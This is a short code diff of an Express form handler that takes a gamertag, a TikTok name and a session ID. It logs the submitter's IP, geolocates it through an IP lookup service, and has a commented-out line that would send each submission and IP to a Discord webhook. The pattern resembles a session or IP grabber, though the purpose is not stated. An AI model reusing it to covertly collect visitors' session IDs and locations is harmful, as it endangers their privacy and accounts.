@@ -15,16 +15,17 @@ app.post('/', async (req, res) => {
   const tiktok = req.body.tiktok || 'Not provided';
   const sessionID = req.body.sessionID;
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress).split(',')[0].replace("::ffff:","");
+  console.log(" IP : " + ip)
 /*await axios.post(DISCORD_WEBHOOK_URL, {
   content: `New submission: ${gamertag} | ${ip}`
 });*/
 
  let locationString =  "Unknown Location";
   try {
+
        const geo = await axios.get(`https://freeipapi.com/api/json/${ip}`);
        const location = geo.data;
-      console.log(JSON.stringify(geo))
-      //console.log(JSON.stringify(location))
+       console.log(JSON.stringify(location))
        locationString = `${location.city || 'Unknown City'}, ${location.region || 'Unknown Region'}, ${location.country || 'Unknown Country'}`;
   } catch (error) {
       console.error("Error getting location: " + error.message)
